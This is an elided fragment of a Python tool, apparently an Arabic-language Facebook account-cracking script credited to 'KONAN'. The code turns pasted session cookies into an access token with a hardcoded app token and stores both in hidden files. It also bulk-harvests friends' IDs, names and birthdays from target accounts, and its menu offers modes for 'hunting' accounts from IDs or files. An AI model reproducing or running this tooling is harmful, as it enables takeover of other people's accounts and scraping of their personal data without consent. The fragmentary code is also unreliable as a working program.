...
g= datetime.datetime(2023, 11, 13, 0,  0, 0)
     ...
     {b} َ𝗧𝙚𝗟𝙂𝙧𝘼𝗠   : @KO00NAN 
        ...
        {b}𝗙𝘼𝘾𝙚𝘽𝙤𝙤𝙆🔥★ {K2}كو نانﹾ٭
             ...
             ><><><>>><>><><>><><<><><>><>>>>>   
                 ...
                 ''',width=79,title=f'[bold green]مKONAN',style='bold green'))
...
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input('حط الكوكيز حب')
		...
		with requests.Session() as r:
			...
			try:
				...
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''}
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					print("الكوكيز مستعمل جيب غيرو", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'تم⛔❤️💠' in str(response6):
							...
							print(f"\n {k}توكن الحساب╰─ : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n تم تسجيل الدخول ارجع شغل الاداة✅❤️╰─");exit()
...
def menu(my_name,my_id):
	...
	table.add_row("01","صيد من ايدي واحد╰─","🟢")
	table.add_row("02","صيد من عدة ايديات╰─","شغال✅")
	table.add_row("03","صيد من ملف╰─","🟢")
...
def dump_massal():
	with requests.Session() as ses:
		...
		cok = open('.cok.txt','r').read()
		print('\x1b[1;37m=============================')
		po=input('(!)ادخل عدد الايديات')
		for pio in range(int(po)):
			ap = input(' \033[2;36m╰─>  \033[2;35mID : ')
			firasid.append(ap)
		for a in firasid :
			try:
				params = {
			...
			"fields": "name,friends.fields(id,name,birthday)"
				...
				print(e)
		print('\x1b[1;37m*****************')
		print(' \033[2;36m╰─> \033[2;35mمجموع الايديات : \033[2;32m'+str(len(id)))
		setting()
		print('\x1b[1;37m***********')
#-------------[ PENGATURAN-IDZ ]---------------#
def File2():
			print('')
			print('\x1b[1;92m             خلي ايديات من محافظتك كرمال مانصيد سكيور✅')
			try:
				print('        - - - - - - - - - - - -')
...
def setting():
	...
	table.add_column("الرقم👇",justify="center",width=20,style="green")
	table.add_row("01","السيرفر الآول","افضل")
	table.add_row("02","السيرفر الثاني","🟢")
